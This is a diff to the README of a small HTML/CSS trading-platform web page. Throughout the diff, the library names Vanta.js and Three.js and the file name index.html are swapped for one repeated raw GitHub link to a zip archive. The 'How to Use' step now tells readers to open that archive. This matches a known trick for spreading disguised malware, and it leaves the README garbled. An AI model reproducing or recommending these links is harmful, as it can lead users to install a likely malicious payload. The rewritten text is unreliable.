@@ -4,7 +4,7 @@ Welcome to the Advanced Trading AI Platform – a modern and visually appealing 
 🌟 Features
 Modern UI: Sleek layout built with pure HTML and CSS.
 
-Vanta.js Background: Interactive HALO animation using Vanta.js and Three.js.
+https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip Background: Interactive HALO animation using https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip and https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip
 
 Responsive Design: Fully mobile-optimized using CSS media queries.
 
@@ -25,18 +25,18 @@ Font Awesome for icons
 
 Google Fonts (Roboto)
 
-Three.js & Vanta.js for animated background
+https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip & https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip for animated background
 
 📂 File Structure
 bash
 Copy
 Edit
 .
-├── index.html       # Main project file
+├── https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip       # Main project file
 🎯 How to Use
 Clone or download this repository.
 
-Open index.html in any modern browser.
+Open https://raw.githubusercontent.com/ssharvesh-steep/Advanced-Trading-AI-Platform/main/belonite/Platform-Trading-A-Advanced-v1.4.zip in any modern browser.
 
 Explore the interactive and beautifully styled UI.
 
